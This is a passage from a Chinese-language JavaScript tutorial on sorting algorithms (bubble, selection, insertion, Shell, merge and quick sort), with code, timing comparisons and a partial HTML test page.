<p>排序过程（手动输入的测试数据）<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/22.jpg" alt="avatar"><br><code>外层循环限定了未排序的范围(从numElements到2),内层循环从左侧的数据开始逐步比较交换，使得未排序范围中最大的数移动到了最右侧，外层排序范围不断缩小，直到还剩两个未排序元素时再比较交换便完成了排序</code></p>
<h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><p><code>选择排序从数组的开头开始，将第一个元素和其他元素进行比较。检查完所有元素后，最小的元素会被放到数组的第一个位置，然后算法会从第二个位置继续。这个过程一直进行，当进行到数组的倒数第二个位置时，所有数据便完成了排序。</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectionSort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> min;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> outer = <span class="number">0</span>; outer &lt;= <span class="keyword">this</span>.dataStore.length - <span class="number">2</span>; ++outer) &#123;</span><br><span class="line">        min = outer;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> inner = outer + <span class="number">1</span>; inner &lt;= <span class="keyword">this</span>.dataStore.length - <span class="number">1</span>; ++inner) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.dataStore[inner] &lt; <span class="keyword">this</span>.dataStore[min]) &#123;</span><br><span class="line">                min = inner;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(<span class="keyword">this</span>.dataStore, outer, min);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>排序过程<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/23.jpg" alt="avatar"></p>
<h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><p><code>插入排序有两个循环。外循环将数组元素挨个移动，而内循环则对外循环中选中的元素进行比较。如果外循环中选中的元素比内循环中选中的元素小，那么数组元素会向右移动，为内循环中的这个元素腾出位置。</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertionSort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp, inner;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> outer = <span class="number">1</span>; outer &lt;= <span class="keyword">this</span>.dataStore.length - <span class="number">1</span>; ++outer) &#123;</span><br><span class="line">    temp = <span class="keyword">this</span>.dataStore[outer];</span><br><span class="line">    inner = outer;</span><br><span class="line">    <span class="keyword">while</span> (inner &gt; <span class="number">0</span> &amp;&amp; (<span class="keyword">this</span>.dataStore[inner - <span class="number">1</span>] &gt;= temp)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.dataStore[inner] = <span class="keyword">this</span>.dataStore[inner - <span class="number">1</span>];</span><br><span class="line">        --inner;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.dataStore[inner] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="基本排序算法的计时比较"><a href="#基本排序算法的计时比较" class="headerlink" title="基本排序算法的计时比较"></a>基本排序算法的计时比较</h2><p>10000个随机数测试<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bubbleSort();<span class="comment">// 100ms左右</span></span><br><span class="line">selectionSort();<span class="comment">// 50ms左右</span></span><br><span class="line">insertionSort();<span class="comment">// 27ms左右</span></span><br></pre></td></tr></table></figure></p>
<p>选择排序和插入排序要比冒泡排序快，插入排序是这三种算法中最快的。</p>
<h2 id="高级排序算法-希尔排序"><a href="#高级排序算法-希尔排序" class="headerlink" title="高级排序算法-希尔排序"></a>高级排序算法-希尔排序</h2><p><code>希尔排序在插入排序的基础上做了很大的改善。它会首先比较距离较远的元素，而非相邻的元素。这样可以使离正确位置很远的元素更快地回到合适的位置。当开始用这个算法遍历数据集时，所有元素之间的距离会不断减小，直到处理到数据集的末尾，这时算法比较的就是相邻元素了。希尔排序的工作原理是，通过定义一个间隔序列来表示排序过程中进行比较的元素之间有多远的间隔。我们可以动态定义间隔序列，不过大部分场景算法要用到的间隔序列可以提前定义好。</code>Marchin Ciura在发表的一篇论文中定义的间隔序列为：701,301,132,57,23,10,4,1。这里我们通过一个小的数据集合来看看这个算法是怎么运行的。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/24.jpg" alt="avatar"><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellsort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> g = <span class="number">0</span>; g &lt; <span class="keyword">this</span>.gaps.length; ++g) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="keyword">this</span>.gaps[g]; i &lt; <span class="keyword">this</span>.dataStore.length; ++i) &#123;</span><br><span class="line">        temp = <span class="keyword">this</span>.dataStore[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = i; j &gt;= <span class="keyword">this</span>.gaps[g] &amp;&amp; <span class="keyword">this</span>.dataStore[j-<span class="keyword">this</span>.gaps[g]] &gt; temp; j -= <span class="keyword">this</span>.gaps[g]) &#123;</span><br><span class="line">        <span class="keyword">this</span>.dataStore[j] = <span class="keyword">this</span>.dataStore[j - <span class="keyword">this</span>.gaps[g]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.dataStore[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们需要在CArray类中增加对间隔序列的定义：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.gaps = [<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>];</span><br></pre></td></tr></table></figure></p>
<h2 id="计算动态间隔序列"><a href="#计算动态间隔序列" class="headerlink" title="计算动态间隔序列"></a>计算动态间隔序列</h2><p>Sedgewick的算法通过下面的代码片段来决定初始间隔值：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> N = <span class="keyword">this</span>.dataStore.length;</span><br><span class="line"><span class="keyword">var</span> h = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (h &lt; N/<span class="number">3</span>) &#123;</span><br><span class="line">    h = <span class="number">3</span> * h + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>间隔值确定好后，这个函数就可以像之前定义的shellsort()函数一样运行了，唯一的区别是，回到外循环之前的最后一条语句会计算一个新的间隔值：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">h = (h<span class="number">-1</span>)/<span class="number">3</span>;</span><br></pre></td></tr></table></figure></p>
<p>动态计算间隔序列的希尔排序<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellsort1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> N = <span class="keyword">this</span>.dataStore.length;</span><br><span class="line">    <span class="keyword">var</span> h = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (h &lt; N/<span class="number">3</span>) &#123;</span><br><span class="line">        h = <span class="number">3</span> * h + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (h &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = h; i &lt; N; i ++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> j = i; j &gt;= h &amp;&amp; <span class="keyword">this</span>.dataStore[j] &lt; <span class="keyword">this</span>.dataStore[j-h]; j -= h) &#123;</span><br><span class="line">                <span class="keyword">this</span>.swap(<span class="keyword">this</span>.dataStore, j, j - h);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        h = (h<span class="number">-1</span>)/<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对于10000个随机数的排序测试：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">myNums.shellsort(); <span class="comment">// 20ms左右</span></span><br><span class="line">myNums.shellsort1(); <span class="comment">// 8ms左右</span></span><br></pre></td></tr></table></figure></p>
<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p><code>归并排序把一系列排好序的子序列合并成一个大的完整有序序列。我们需要两个排好序的子数组，然后通过比较数据大小，从最小的数据开始插入，最后合并得到第三个数组。然而，在实际情况中，归并排序还有一些问题，我们需要更大的空间来合并存储两个子数组。</code></p>
<h2 id="2-自底向上的归并排序"><a href="#2-自底向上的归并排序" class="headerlink" title="2.自底向上的归并排序"></a>2.自底向上的归并排序</h2><p>通常来讲，归并排序会使用递归的算法来实现。然而，在JavaScript中这种方式不太可行，因为递归的深度太深了。所以，我们使用一种非递归的方式来实现这个算法，这种策略称为自底向上的归并排序。<br>这个算法首先将数据集分解为一组只有一个元素的数组。然后通过创建一组左右子数组将它们慢慢合并起来，每次合并都保存一部分排好序的数据，直到最后剩下的这个数组所有的数据都已完美排序。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/25.jpg" alt="avatar"><br>算法代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = <span class="keyword">this</span>.dataStore;</span><br><span class="line">    <span class="keyword">if</span> (arr.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> step = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> left, right;</span><br><span class="line">    <span class="keyword">while</span> (step &lt; arr.length) &#123;</span><br><span class="line">    left = <span class="number">0</span>;</span><br><span class="line">    right = step;</span><br><span class="line">    <span class="keyword">while</span> (right + step &lt;= arr.length) &#123;</span><br><span class="line">        <span class="keyword">this</span>.mergeArrays(arr, left, left+step, right, right+step);</span><br><span class="line">        left = right + step;</span><br><span class="line">        right = left + step;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (right &lt; arr.length) &#123;</span><br><span class="line">        <span class="keyword">this</span>.mergeArrays(arr, left, left+step, right, arr.length);</span><br><span class="line">    &#125;</span><br><span class="line">    step *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeArrays</span>(<span class="params">arr, startLeft, stopLeft, startRight, stopRight</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> rightArr = <span class="keyword">new</span> <span class="built_in">Array</span>(stopRight - startRight + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> leftArr = <span class="keyword">new</span> <span class="built_in">Array</span>(stopLeft - startLeft + <span class="number">1</span>);</span><br><span class="line">    k = startRight;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; (rightArr.length<span class="number">-1</span>); ++i) &#123;</span><br><span class="line">    rightArr[i] = arr[k];</span><br><span class="line">    ++k;</span><br><span class="line">    &#125;</span><br><span class="line">    k = startLeft;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; (leftArr.length<span class="number">-1</span>); ++i) &#123;</span><br><span class="line">    leftArr[i] = arr[k];</span><br><span class="line">    ++k;</span><br><span class="line">    &#125;</span><br><span class="line">    rightArr[rightArr.length - <span class="number">1</span>] = <span class="literal">Infinity</span>;</span><br><span class="line">    leftArr[leftArr.length - <span class="number">1</span>] = <span class="literal">Infinity</span>;</span><br><span class="line">    <span class="keyword">var</span> m = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> k = startLeft; k &lt; stopRight; ++k) &#123;</span><br><span class="line">    <span class="keyword">if</span> (leftArr[m] &lt;= rightArr[n]) &#123;</span><br><span class="line">        arr[k] = leftArr[m];</span><br><span class="line">        m++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        arr[k] = rightArr[n];</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p><code>快速排序是处理大数据集最快的排序算法之一。它是一种分而治之的算法，通过递归的方法将数据依次分解为包含较小元素和较大元素的不同子序列。该算法不断重复这个步骤直到所有数据都是有序的。</code><br><code>这个算法首先要在列表中选择一个元素作为基准值(pivot)。数据排序围绕基准值进行，将列表中小于基准值的元素移到数组的底部，将大于基准值的元素移到数组的顶部。</code><br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/26.jpg" alt="avatar"></p>
<h2 id="算法伪代码"><a href="#算法伪代码" class="headerlink" title="算法伪代码"></a>算法伪代码</h2><ol>
<li>选择一个基准元素，将列表分隔成两个子序列</li>
<li>对列表重新排序，将所有小于基准值的元素放在基准值的前面，所有大于基准值得元素放在基准值的后面</li>
<li>分别对较小元素的子序列和较大元素的子序列重复步骤1和2<br>程序如下：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qSort</span>(<span class="params">list</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> list;</span><br><span class="line">    <span class="keyword">if</span> (list.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lesser = [];</span><br><span class="line">    <span class="keyword">var</span> greater = [];</span><br><span class="line">    <span class="keyword">var</span> pivot = list[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; list.length; i ++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (list[i] &lt; pivot) &#123;</span><br><span class="line">        lesser.push(list[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        greater.push(list[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.qSort(lesser).concat(pivot, <span class="keyword">this</span>.qSort(greater));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>在qSort函数返回前输出排序过程<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(lesser.concat(pivot, greater).toString());</span><br></pre></td></tr></table></figure></p>
<p><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/27.jpg" alt="avatar"><br>10000个随机数排序测试<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">qSort(); <span class="comment">// 17ms左右</span></span><br></pre></td></tr></table></figure></p>
<p>快速排序算法非常适用于大型数据集合；在处理小数据集时性能反而会下降。<br>附测试平台代码<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">CArray</span>(<span class="params">numElements</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// this.dataStore = [72, 54, 58, 30, 31, 78, 2, 77, 82, 72];</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.dataStore = [];</span></span><br><span class="line"><span class="javascript">      <span class="comment">// this.dataStore = [44, 75, 23, 43, 55, 12, 64, 77 ,33];</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.numElements = numElements;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.toString = toString;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.clear = clear;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.setData = setData;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.swap = swap;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.bubbleSort = bubbleSort;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.selectionSort = selectionSort;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.insertionSort = insertionSort;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.shellsort = shellsort;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.shellsort1 = shellsort1;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.mergeSort = mergeSort;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.mergeArrays = mergeArrays;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.qSort = qSort;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.gaps = [<span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>];</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">setData</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.numElements; ++i) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.dataStore[i] = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (<span class="keyword">this</span>.numElements + <span class="number">1</span>));</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.numElements; ++i) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.dataStore[i] = <span class="number">0</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">toString</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> restr = <span class="string">""</span>;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.numElements; ++i) &#123;</span></span><br><span class="line"><span class="javascript">        restr += <span class="keyword">this</span>.dataStore[i] + <span class="string">" "</span>;</span></span><br><span class="line">        if (i &gt; 0 &amp;&amp; i % 10 == 0) &#123;</span><br><span class="line"><span class="javascript">          restr += <span class="string">"\n"</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> restr;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, index1, index2</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> temp = arr[index1];</span></span><br><span class="line">      arr[index1] = arr[index2];</span><br><span class="line">      arr[index2] = temp;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">selectionSort</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> min;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> outer = <span class="number">0</span>; outer &lt;= <span class="keyword">this</span>.dataStore.length - <span class="number">2</span>; ++outer) &#123;</span></span><br><span class="line">            min = outer;</span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> inner = outer + <span class="number">1</span>; inner &lt;= <span class="keyword">this</span>.dataStore.length - <span class="number">1</span>; ++inner) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="keyword">this</span>.dataStore[inner] &lt; <span class="keyword">this</span>.dataStore[min]) &#123;</span></span><br><span class="line">                    min = inner;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            swap(<span class="keyword">this</span>.dataStore, outer, min);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> numElements = <span class="keyword">this</span>.dataStore.length;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> outer = numElements; outer &gt;= <span class="number">2</span>; --outer) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> inner = <span class="number">0</span>; inner &lt; outer - <span class="number">1</span>; ++inner) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="keyword">this</span>.dataStore[inner] &gt; <span class="keyword">this</span>.dataStore[inner + <span class="number">1</span>]) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">this</span>.swap(<span class="keyword">this</span>.dataStore, inner, inner + <span class="number">1</span>);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">insertionSort</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> temp, inner;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">for</span> (<span class="keyword">var</span> outer = <span class="number">1</span>; outer &lt;= <span class="keyword">this</span>.dataStore.length - <span class="number">1</span>; ++outer) &#123;</span></span><br><span class="line"><span class="javascript">        temp = <span class="keyword">this</span>.dataStore[outer];</span></span><br><span class="line">        inner = outer;</span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (inner &gt; <span class="number">0</span> &amp;&amp; (<span class="keyword">this</span>.dataStore[inner - <span class="number">1</span>] &gt;= temp)) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">this</span>.dataStore[inner] = <span class="keyword">this</span>.dataStore[inner - <span class="number">1</span>];</span></span><br><span class="line">          --inner;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.dataStore[inner] = temp;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">shellsort</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> temp;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">for</span> (<span class="keyword">var</span> g = <span class="number">0</span>; g &lt; <span class="keyword">this</span>.gaps.length; ++g) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="keyword">this</span>.gaps[g]; i &lt; <span class="keyword">this</span>.dataStore.length; ++i) &#123;</span></span><br><span class="line"><span class="javascript">          temp = <span class="keyword">this</span>.dataStore[i];</span></span><br><span class="line"><span class="javascript">          <span class="keyword">for</span> (<span class="keyword">var</span> j = i; j &gt;= <span class="keyword">this</span>.gaps[g] &amp;&amp; <span class="keyword">this</span>.dataStore[j-<span class="keyword">this</span>.gaps[g]] &gt; temp; j -= <span class="keyword">this</span>.gaps[g]) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.dataStore[j] = <span class="keyword">this</span>.dataStore[j - <span class="keyword">this</span>.gaps[g]];</span></span><br><span class="line">          &#125;</span><br><span class="line"><span class="javascript">          <span class="keyword">this</span>.dataStore[j] = temp;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">shellsort1</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> N = <span class="keyword">this</span>.dataStore.length;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> h = <span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">while</span> (h &lt; N/<span class="number">3</span>) &#123;</span></span><br><span class="line">          h = 3 * h + 1;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">while</span> (h &gt;= <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">for</span> (<span class="keyword">var</span> i = h; i &lt; N; i ++) &#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">for</span> (<span class="keyword">var</span> j = i; j &gt;= h &amp;&amp; <span class="keyword">this</span>.dataStore[j] &lt; <span class="keyword">this</span>.dataStore[j-h]; j -= h) &#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.swap(<span class="keyword">this</span>.dataStore, j, j - h);</span></span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          h = (h-1)/3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> arr = <span class="keyword">this</span>.dataStore;</span></span><br><span class="line">      if (arr.length &lt; 2) &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">return</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> step = <span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> left, right;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">while</span> (step &lt; arr.length) &#123;</span></span><br><span class="line">        left = 0;</span><br><span class="line">        right = step;</span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (right + step &lt;= arr.length) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">this</span>.mergeArrays(arr, left, left+step, right, right+step);</span></span><br><span class="line">          left = right + step;</span><br><span class="line">          right = left + step;</span><br><span class="line">        &#125;</span><br><span class="line">        if (right &lt; arr.length) &#123;</span><br><span class="line"><span class="javascript">          <span class="keyword">this</span>.mergeArrays(arr, left, left+step, right, arr.length);</span></span><br><span class="line">        &#125;</span><br><span class="line">        step *= 2;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">mergeArrays</span>(<span class="params">arr, startLeft, stopLeft, startRight, stopRight</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> rightArr = <span class="keyword">new</span> <span class="built_in">Array</span>(stopRight - startRight + <span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> leftArr = <span class="keyword">new</span> <span class="built_in">Array</span>(stopLeft - startLeft + <span class="number">1</span>);</span></span><br><span class="line">      k = startRight;</span><br><span class="line"><span class="javascript">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; (rightArr.length<span class="number">-1</span>); ++i) &#123;</span></span><br><span class="line">        rightArr[i] = arr[k];</span><br><span class="line">        ++k;</span><br><span class="line">      &#125;</span><br><span class="line">      k = startLeft;</span><br><span class="line"><span class="javascript">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; (leftArr.length<span class="number">-1</span>); ++i) &#123;</span></span><br><span class="line">        leftArr[i] = arr[k];</span><br><span class="line">        ++k;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      rightArr[rightArr.length - <span class="number">1</span>] = <span class="literal">Infinity</span>;</span></span><br><span class="line"><span class="javascript">      leftArr[leftArr.length - <span class="number">1</span>] = <span class="literal">Infinity</span>;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> m = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> n = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">for</span> (<span class="keyword">var</span> k = startLeft; k &lt; stopRight; ++k) &#123;</span></span><br><span class="line">        if (leftArr[m] &lt;= rightArr[n]) &#123;</span><br><span class="line">          arr[k] = leftArr[m];</span><br><span class="line">          m++;</span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">          arr[k] = rightArr[n];</span><br><span class="line">          n++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">qSort</span>(<span class="params">list</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> list;</span></span><br><span class="line">        if (list.length == 0) 